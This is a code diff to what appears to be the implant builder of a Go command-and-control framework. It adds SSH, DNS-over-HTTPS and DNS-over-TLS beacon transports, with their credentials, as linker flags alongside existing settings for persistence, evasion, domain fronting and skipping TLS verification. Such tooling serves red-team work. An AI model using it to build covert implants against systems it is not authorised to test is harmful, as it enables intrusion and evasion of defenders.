@@ -64,7 +64,15 @@ func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) stri
 		listenerID = fmt.Sprintf("%d", cfg.ListenerID)
 	}
 
-	return fmt.Sprintf(prefix+` -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethodStr=%s" -X "main.ListenerIDStr=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s" -X "main.WorkingStartStr=%s" -X "main.WorkingEndStr=%s" -X "main.WorkingTZStr=%s"`,
+	transport := cfg.BeaconTransport
+	if transport == "" {
+		transport = cfg.Protocol
+	}
+	if transport == "" {
+		transport = "http"
+	}
+
+	return fmt.Sprintf(prefix+` -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethodStr=%s" -X "main.ListenerIDStr=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.DNSDoHURL=%s" -X "main.DNSDoTAddr=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s" -X "main.WorkingStartStr=%s" -X "main.WorkingEndStr=%s" -X "main.WorkingTZStr=%s" -X "main.BeaconTransportStr=%s" -X "main.SSHUserStr=%s" -X "main.SSHPasswordStr=%s" -X "main.SSHKeyStr=%s" -X "main.SSHHostKeyStr=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -81,6 +89,8 @@ func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) stri
 		escape(cfg.P2PListenAddr),
 		escape(cfg.DNSDomain),
 		escape(cfg.DNSServer),
+		escape(cfg.DNSDoHURL),
+		escape(cfg.DNSDoTAddr),
 		escape(cfg.Proxy),
 		escape(cfg.CryptoKey),
 		escape(cfg.ExpiryDate),
@@ -89,6 +99,11 @@ func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) stri
 		escape(cfg.WorkingStart),
 		escape(cfg.WorkingEnd),
 		escape(cfg.WorkingTZ),
+		escape(transport),
+		escape(cfg.SSHUser),
+		escape(cfg.SSHPassword),
+		escape(cfg.SSHKey),
+		escape(cfg.SSHHostKey),
 	)
 }
 
@@ -424,6 +439,14 @@ type ImplantConfig struct {
 	WorkingStart string // HH:MM start of working hours (empty = disabled)
 	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
 	WorkingTZ    string // IANA timezone (empty = UTC)
+	// Advanced transport (injected as ldflags into agent)
+	BeaconTransport string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c
+	DNSDoHURL       string
+	DNSDoTAddr      string
+	SSHUser         string
+	SSHPassword     string
+	SSHKey          string // base64 PEM client private key
+	SSHHostKey      string // base64 server host public key pin (empty = lab insecure)
 }
 
 // forgeC2ModuleReplace returns a `replace` directive for the local
